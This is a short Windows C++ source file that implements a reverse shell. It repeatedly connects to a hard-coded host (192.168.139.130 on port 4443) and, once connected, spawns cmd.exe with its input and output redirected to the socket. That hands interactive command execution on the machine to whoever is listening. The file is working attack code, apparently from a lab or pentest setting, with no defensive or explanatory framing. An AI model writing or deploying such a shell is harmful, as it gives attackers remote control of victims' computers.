#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_PORT 4443
#define DEFAULT_HOST L"192.168.139.130"

int _tmain(void*)
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	int iResult;
	BOOL isConnected = FALSE;

	struct sockaddr_in sa;
	ZeroMemory(&sa, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(DEFAULT_PORT);
	InetPtonW(sa.sin_family, DEFAULT_HOST, &sa.sin_addr);

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		_tprintf(TEXT("WSAStartup failed: %d\n"), iResult);
		return 1;
	}

	while (!isConnected)
	{
		ConnectSocket = WSASocketW(sa.sin_family, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
		if (ConnectSocket == INVALID_SOCKET) {
			_tprintf(TEXT("Error at WSASocket(): %ld\n"), WSAGetLastError());
		}
		else if (connect(ConnectSocket, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
		}
		else {
			isConnected = TRUE;
			break;
		}

		Sleep(10000);
	}

	// Configure Windows properties
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	 LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe";

	if (!CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		_tprintf(L"CreateProcess failed: %d\n", GetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}